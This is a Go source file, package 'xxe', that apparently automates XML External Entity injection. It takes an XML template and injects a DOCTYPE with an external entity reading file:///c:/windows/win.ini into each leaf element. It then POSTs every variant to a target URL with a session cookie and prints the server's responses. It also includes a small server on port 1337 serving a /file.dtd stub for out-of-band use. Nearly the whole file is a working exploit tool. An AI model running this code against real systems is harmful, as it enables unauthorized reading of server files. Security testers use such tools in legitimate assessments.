package xxe

import (
	"bytes"
	"encoding/xml"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"regexp"

	str "strings"
)

type NodeT struct {
	XMLName xml.Name
	Attrs   []xml.Attr `xml:"-"`
	Content []byte     `xml:",innerxml"`
	Nodes   []NodeT    `xml:",any"`
}

type LeafT struct {
	Name  string
	Value string
}

func walkNodes(nodes []NodeT, f func(NodeT) bool) {
	for _, n := range nodes {
		if f(n) {
			walkNodes(n.Nodes, f)
		}
	}
}

func DirectTest(url, xmlTemplate, cookie string) error {
	fmt.Println("testing...")

	xmlData, err := ioutil.ReadFile(xmlTemplate)
	if err != nil {
		return err
	}

	dec := xml.NewDecoder(bytes.NewBuffer(xmlData))

	var n NodeT
	err = dec.Decode(&n)
	if err != nil {
		return err
	}

	var leafs []LeafT
	walkNodes([]NodeT{n}, func(n NodeT) bool {
		decTest := xml.NewDecoder(bytes.NewBuffer(n.Content))
		var nTest NodeT
		err = decTest.Decode(&nTest)
		if err != nil {
			leaf := LeafT{Name: n.XMLName.Local,
				Value: string(n.Content)}
			leafs = append(leafs, leaf)
		}

		return true
	})

	file := "c:/windows/win.ini"
	entity := fmt.Sprintf(
		`<!DOCTYPE root [<!ENTITY ext SYSTEM "file:///%s"> ]>`, file)

	reqXml := str.Replace(string(xmlData), "?>", "?>"+entity, 1)

	for _, leaf := range leafs {
		exp := fmt.Sprintf(`(<%s>).*(</%s>)`, leaf.Name, leaf.Name)
		re := regexp.MustCompile(exp)
		reqXmlMod := re.ReplaceAllString(reqXml, `${1}&ext;${2}`)

		makeRequest(url, reqXmlMod, cookie)
	}

	return nil
}

func makeRequest(url, reqXml, cookie string) {
	client := &http.Client{}

	req, err := http.NewRequest("POST", url, str.NewReader(reqXml))
	if err != nil {
		fmt.Printf("error %+v...\n", err)
		return
	}
	req.Header.Set("Content-Type", "text/xml")
	req.Header.Set("cookie", cookie)
	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("error %+v...\n", err)
		return
	}
	bodyText, err := ioutil.ReadAll(resp.Body)
	fmt.Printf("%s\n", bodyText)
}

func dtdHandler(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/file.dtd" {
		http.Error(w, "404 not found.", http.StatusNotFound)
		return
	}

	if r.Method != "GET" {
		http.Error(w, "Method is not supported.", http.StatusNotFound)
		return
	}

	fmt.Fprintf(w, "Hello!")
}

func serveDtd() {
	http.HandleFunc("/file.dtd", dtdHandler)

	fmt.Printf("Starting server at port 1337\n")
	if err := http.ListenAndServe(":1337", nil); err != nil {
		log.Fatal(err)
	}
}
